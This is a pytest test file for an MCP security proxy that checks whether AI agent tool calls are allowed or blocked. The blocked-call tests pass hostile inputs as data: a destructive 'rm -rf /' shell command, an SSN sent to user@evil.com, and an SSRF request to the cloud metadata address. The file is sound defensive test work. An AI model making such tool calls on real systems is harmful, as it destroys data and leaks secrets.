"""Tests for the MCP proxy (mcp_proxy.py).

Run:
    cd edge-connector
    python -m pytest tests/test_mcp_proxy.py -v
"""
from __future__ import annotations

import asyncio
import json
import sys
from pathlib import Path
from typing import Any, Dict, Optional
from unittest.mock import AsyncMock, MagicMock, patch

import pytest

# Ensure the tools directory is importable
sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "tools"))

from generic_hook import ACTION_ALLOW, ACTION_BLOCK, Verdict
from mcp_proxy import (
    MCPProxy,
    ProxyConfig,
    SecurityGate,
    _HttpUpstream,
    _StdioUpstream,
    _encode,
    _make_error,
)


# -----------------------------------------------------------------------
# Helpers
# -----------------------------------------------------------------------

def _tool_call_msg(tool_name: str, arguments: Dict[str, Any],
                   req_id: int = 1) -> Dict:
    """Build a minimal MCP tools/call request."""
    return {
        "jsonrpc": "2.0",
        "id": req_id,
        "method": "tools/call",
        "params": {"name": tool_name, "arguments": arguments},
    }


def _tools_list_msg(req_id: int = 2) -> Dict:
    return {"jsonrpc": "2.0", "id": req_id, "method": "tools/list", "params": {}}


def _initialize_msg(req_id: int = 3) -> Dict:
    return {
        "jsonrpc": "2.0",
        "id": req_id,
        "method": "initialize",
        "params": {
            "protocolVersion": "2024-11-05",
            "capabilities": {},
            "clientInfo": {"name": "test", "version": "0.1"},
        },
    }


def _make_proxy(
    *,
    verdict: Optional[Verdict] = None,
    upstream_response: Optional[Dict] = None,
) -> MCPProxy:
    """Create an MCPProxy with mocked gate and upstream."""
    config = ProxyConfig(
        upstream_transport="stdio",
        upstream_command=["echo"],
        fail_mode="closed",
    )
    proxy = MCPProxy.__new__(MCPProxy)
    proxy._config = config

    # Mock the security gate
    gate = MagicMock(spec=SecurityGate)
    if verdict is not None:
        gate.evaluate_tool_call.return_value = verdict
    else:
        gate.evaluate_tool_call.return_value = Verdict.allow()
    proxy._gate = gate

    # Mock the upstream
    upstream = AsyncMock()
    if upstream_response is not None:
        upstream.send.return_value = upstream_response
    else:
        upstream.send.return_value = {
            "jsonrpc": "2.0",
            "id": 1,
            "result": {"content": [{"type": "text", "text": "ok"}]},
        }
    proxy._upstream = upstream

    return proxy


# -----------------------------------------------------------------------
# JSON-RPC helpers
# -----------------------------------------------------------------------

class TestJsonRpcHelpers:
    def test_make_error(self):
        err = _make_error(42, -32001, "blocked", {"tool": "exec"})
        assert err["jsonrpc"] == "2.0"
        assert err["id"] == 42
        assert err["error"]["code"] == -32001
        assert err["error"]["message"] == "blocked"
        assert err["error"]["data"]["tool"] == "exec"

    def test_make_error_no_data(self):
        err = _make_error(1, -32600, "bad request")
        assert "data" not in err["error"]

    def test_encode_produces_newline_delimited_json(self):
        msg = {"jsonrpc": "2.0", "id": 1, "method": "ping"}
        encoded = _encode(msg)
        assert encoded.endswith(b"\n")
        decoded = json.loads(encoded)
        assert decoded["method"] == "ping"


# -----------------------------------------------------------------------
# ProxyConfig
# -----------------------------------------------------------------------

class TestProxyConfig:
    def test_from_env_stdio(self, monkeypatch):
        monkeypatch.setenv("DCLAW_MCP_UPSTREAM", '["python3", "server.py"]')
        monkeypatch.setenv("DCLAW_MCP_TRANSPORT", "stdio")
        monkeypatch.setenv("DCLAW_FAIL_OPEN", "1")

        cfg = ProxyConfig.from_env()
        assert cfg.upstream_transport == "stdio"
        assert cfg.upstream_command == ["python3", "server.py"]
        assert cfg.fail_mode == "open"

    def test_from_env_http(self, monkeypatch):
        monkeypatch.setenv("DCLAW_MCP_UPSTREAM", "http://localhost:8088/mcp")
        monkeypatch.setenv("DCLAW_MCP_TRANSPORT", "http")
        monkeypatch.setenv("DCLAW_MCP_PORT", "9999")

        cfg = ProxyConfig.from_env()
        assert cfg.upstream_transport == "http"
        assert cfg.upstream_url == "http://localhost:8088/mcp"
        assert cfg.http_port == 9999

    def test_from_env_defaults(self, monkeypatch):
        monkeypatch.delenv("DCLAW_MCP_UPSTREAM", raising=False)
        monkeypatch.delenv("DCLAW_MCP_TRANSPORT", raising=False)
        monkeypatch.delenv("DCLAW_FAIL_OPEN", raising=False)

        cfg = ProxyConfig.from_env()
        assert cfg.upstream_transport == "stdio"
        assert cfg.fail_mode == "closed"

    def test_from_env_string_command(self, monkeypatch):
        monkeypatch.setenv("DCLAW_MCP_UPSTREAM", "python3 server.py --verbose")
        monkeypatch.setenv("DCLAW_MCP_TRANSPORT", "stdio")

        cfg = ProxyConfig.from_env()
        assert cfg.upstream_command == ["python3", "server.py", "--verbose"]


# -----------------------------------------------------------------------
# Tool call interception — ALLOW
# -----------------------------------------------------------------------

class TestToolCallAllow:
    @pytest.mark.asyncio
    async def test_allowed_tool_call_forwarded(self):
        upstream_resp = {
            "jsonrpc": "2.0",
            "id": 1,
            "result": {"content": [{"type": "text", "text": "temperature: 22C"}]},
        }
        proxy = _make_proxy(
            verdict=Verdict.allow(),
            upstream_response=upstream_resp,
        )

        msg = _tool_call_msg("get_temperature", {"sensor_id": "A1"})
        resp = await proxy.handle_message(msg)

        assert resp is not None
        assert "result" in resp
        assert resp["result"]["content"][0]["text"] == "temperature: 22C"

        # Verify the gate was called
        proxy._gate.evaluate_tool_call.assert_called_once_with(
            "get_temperature", {"sensor_id": "A1"},
        )
        # Verify the message was forwarded to upstream
        proxy._upstream.send.assert_called_once_with(msg)

    @pytest.mark.asyncio
    async def test_allowed_tool_call_preserves_request_id(self):
        proxy = _make_proxy(verdict=Verdict.allow())
        proxy._upstream.send.return_value = {
            "jsonrpc": "2.0", "id": 99, "result": {},
        }

        msg = _tool_call_msg("read_sensor", {}, req_id=99)
        resp = await proxy.handle_message(msg)
        assert resp["id"] == 99


# -----------------------------------------------------------------------
# Tool call interception — BLOCK
# -----------------------------------------------------------------------

class TestToolCallBlock:
    @pytest.mark.asyncio
    async def test_blocked_tool_call_returns_error(self):
        proxy = _make_proxy(
            verdict=Verdict.from_raw(ACTION_BLOCK, 0x04),  # HASH_DENY
        )

        msg = _tool_call_msg("exec_shell", {"command": "rm -rf /"})
        resp = await proxy.handle_message(msg)

        assert resp is not None
        assert "error" in resp
        assert resp["error"]["code"] == -32001
        assert "HASH_DENY" in resp["error"]["message"]
        assert resp["error"]["data"]["tool"] == "exec_shell"
        assert resp["error"]["data"]["action"] == "block"

        # Verify upstream was NOT called
        proxy._upstream.send.assert_not_called()

    @pytest.mark.asyncio
    async def test_blocked_tool_call_preserves_request_id(self):
        proxy = _make_proxy(
            verdict=Verdict.from_raw(ACTION_BLOCK, 0x05),  # RATE_LIMIT
        )
        msg = _tool_call_msg("run_command", {"cmd": "whoami"}, req_id=42)
        resp = await proxy.handle_message(msg)

        assert resp["id"] == 42
        assert "error" in resp

    @pytest.mark.asyncio
    async def test_blocked_content_scan(self):
        proxy = _make_proxy(
            verdict=Verdict.from_raw(ACTION_BLOCK, 0x0C),  # CONTENT_BLOCK
        )
        msg = _tool_call_msg(
            "send_message",
            {"to": "user@evil.com", "body": "SSN: 123-45-6789"},
        )
        resp = await proxy.handle_message(msg)

        assert "error" in resp
        assert "CONTENT_BLOCK" in resp["error"]["message"]

    @pytest.mark.asyncio
    async def test_blocked_ssrf(self):
        proxy = _make_proxy(
            verdict=Verdict.from_raw(ACTION_BLOCK, 0x0D),  # SSRF_BLOCK
        )
        msg = _tool_call_msg(
            "http_request",
            {"url": "http://169.254.169.254/latest/meta-data/"},
        )
        resp = await proxy.handle_message(msg)

        assert "error" in resp
        assert "SSRF_BLOCK" in resp["error"]["message"]


# -----------------------------------------------------------------------
# Passthrough for non-tool messages
# -----------------------------------------------------------------------

class TestPassthrough:
    @pytest.mark.asyncio
    async def test_tools_list_forwarded(self):
        tools_resp = {
            "jsonrpc": "2.0",
            "id": 2,
            "result": {"tools": [{"name": "get_temp"}, {"name": "start_motor"}]},
        }
        proxy = _make_proxy(upstream_response=tools_resp)

        msg = _tools_list_msg()
        resp = await proxy.handle_message(msg)

        assert resp is not None
        assert "result" in resp
        assert len(resp["result"]["tools"]) == 2

        # Gate should NOT have been called
        proxy._gate.evaluate_tool_call.assert_not_called()

    @pytest.mark.asyncio
    async def test_initialize_forwarded(self):
        init_resp = {
            "jsonrpc": "2.0",
            "id": 3,
            "result": {
                "protocolVersion": "2024-11-05",
                "capabilities": {"tools": {}},
                "serverInfo": {"name": "test-server", "version": "0.1"},
            },
        }
        proxy = _make_proxy(upstream_response=init_resp)

        msg = _initialize_msg()
        resp = await proxy.handle_message(msg)

        assert resp is not None
        assert resp["result"]["serverInfo"]["name"] == "test-server"
        proxy._gate.evaluate_tool_call.assert_not_called()

    @pytest.mark.asyncio
    async def test_resources_read_forwarded(self):
        proxy = _make_proxy(upstream_response={
            "jsonrpc": "2.0", "id": 4,
            "result": {"contents": [{"uri": "file:///tmp/a.txt", "text": "hello"}]},
        })

        msg = {
            "jsonrpc": "2.0", "id": 4,
            "method": "resources/read",
            "params": {"uri": "file:///tmp/a.txt"},
        }
        resp = await proxy.handle_message(msg)

        assert "result" in resp
        proxy._gate.evaluate_tool_call.assert_not_called()

    @pytest.mark.asyncio
    async def test_prompts_get_forwarded(self):
        proxy = _make_proxy(upstream_response={
            "jsonrpc": "2.0", "id": 5,
            "result": {"messages": [{"role": "user", "content": {"type": "text", "text": "hi"}}]},
        })

        msg = {
            "jsonrpc": "2.0", "id": 5,
            "method": "prompts/get",
            "params": {"name": "greeting"},
        }
        resp = await proxy.handle_message(msg)

        assert "result" in resp
        proxy._gate.evaluate_tool_call.assert_not_called()

    @pytest.mark.asyncio
    async def test_notification_forwarded_no_response(self):
        proxy = _make_proxy()

        notification = {
            "jsonrpc": "2.0",
            "method": "notifications/cancelled",
            "params": {"requestId": 10},
        }
        resp = await proxy.handle_message(notification)

        # Notifications have no id, so no response is returned
        assert resp is None
        proxy._gate.evaluate_tool_call.assert_not_called()

    @pytest.mark.asyncio
    async def test_unknown_method_forwarded(self):
        proxy = _make_proxy(upstream_response={
            "jsonrpc": "2.0", "id": 6, "result": {"ok": True},
        })

        msg = {"jsonrpc": "2.0", "id": 6, "method": "custom/method", "params": {}}
        resp = await proxy.handle_message(msg)

        assert "result" in resp
        proxy._gate.evaluate_tool_call.assert_not_called()


# -----------------------------------------------------------------------
# Error handling
# -----------------------------------------------------------------------

class TestErrorHandling:
    @pytest.mark.asyncio
    async def test_upstream_unavailable_on_passthrough(self):
        proxy = _make_proxy()
        proxy._upstream.send.side_effect = ConnectionError("process died")

        msg = _tools_list_msg(req_id=10)
        resp = await proxy.handle_message(msg)

        assert "error" in resp
        assert resp["error"]["code"] == -32603
        assert "Upstream unavailable" in resp["error"]["message"]

    @pytest.mark.asyncio
    async def test_upstream_unavailable_on_allowed_tool_call(self):
        proxy = _make_proxy(verdict=Verdict.allow())
        proxy._upstream.send.side_effect = ConnectionError("refused")

        msg = _tool_call_msg("read_sensor", {"id": 1})
        resp = await proxy.handle_message(msg)

        assert "error" in resp
        assert resp["error"]["code"] == -32603

    @pytest.mark.asyncio
    async def test_notification_upstream_error_ignored(self):
        proxy = _make_proxy()
        proxy._upstream.send.side_effect = ConnectionError("down")

        notification = {
            "jsonrpc": "2.0",
            "method": "notifications/progress",
            "params": {"token": "abc"},
        }
        # Should not raise
        resp = await proxy.handle_message(notification)
        assert resp is None


# -----------------------------------------------------------------------
# MCPProxy construction
# -----------------------------------------------------------------------

class TestProxyConstruction:
    @patch("mcp_proxy.SecurityGate")
    def test_raises_without_upstream(self, mock_gate):
        config = ProxyConfig(
            upstream_transport="stdio",
            upstream_command=None,
            upstream_url=None,
        )
        with pytest.raises(ValueError, match="No upstream configured"):
            MCPProxy(config)

    @patch("mcp_proxy.SecurityGate")
    def test_stdio_upstream_created(self, mock_gate):
        config = ProxyConfig(
            upstream_transport="stdio",
            upstream_command=["python3", "server.py"],
        )
        proxy = MCPProxy(config)
        assert isinstance(proxy._upstream, _StdioUpstream)

    @patch("mcp_proxy.SecurityGate")
    def test_http_upstream_created(self, mock_gate):
        config = ProxyConfig(
            upstream_transport="http",
            upstream_url="http://localhost:8088/mcp",
        )
        proxy = MCPProxy(config)
        assert isinstance(proxy._upstream, _HttpUpstream)


# -----------------------------------------------------------------------
# SecurityGate
# -----------------------------------------------------------------------

class TestSecurityGate:
    @patch("mcp_proxy.EdgeConnector")
    def test_gate_calls_edge_connector(self, mock_ec_cls):
        mock_ec = MagicMock()
        mock_ec.evaluate.return_value = Verdict.allow()
        mock_ec_cls.return_value = mock_ec

        config = ProxyConfig(fail_mode="closed")
        gate = SecurityGate(config)
        v = gate.evaluate_tool_call("read_file", {"path": "/etc/hosts"})

        assert v.blocked is False
        mock_ec.evaluate.assert_called_once_with(
            tool_name="read_file",
            arguments={"path": "/etc/hosts"},
        )

    @patch("mcp_proxy.EdgeConnector")
    def test_gate_shutdown(self, mock_ec_cls):
        mock_ec = MagicMock()
        mock_ec_cls.return_value = mock_ec

        config = ProxyConfig(fail_mode="open")
        gate = SecurityGate(config)
        gate.shutdown()
        mock_ec.shutdown.assert_called_once()

    @patch("mcp_proxy.EdgeConnector")
    def test_gate_fail_open_config(self, mock_ec_cls):
        config = ProxyConfig(fail_mode="open")
        SecurityGate(config)
        mock_ec_cls.assert_called_once_with(
            lib_path=None,
            socket_path=None,
            fail_open=True,
        )

    @patch("mcp_proxy.EdgeConnector")
    def test_gate_fail_closed_config(self, mock_ec_cls):
        config = ProxyConfig(fail_mode="closed")
        SecurityGate(config)
        mock_ec_cls.assert_called_once_with(
            lib_path=None,
            socket_path=None,
            fail_open=False,
        )
